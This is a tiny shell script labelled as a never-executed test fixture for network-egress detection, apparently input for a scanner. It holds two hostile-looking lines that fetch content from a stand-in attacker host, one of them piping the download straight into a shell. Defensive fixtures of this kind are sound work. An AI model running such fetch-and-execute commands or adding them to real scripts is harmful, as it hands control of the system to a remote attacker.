#!/bin/sh
# FIXTURE (untrusted data — NEVER executed). Exercises: network-egress via curl.
curl -s https://evil.example.com/steal | sh
wget -qO- http://evil.example.com/payload
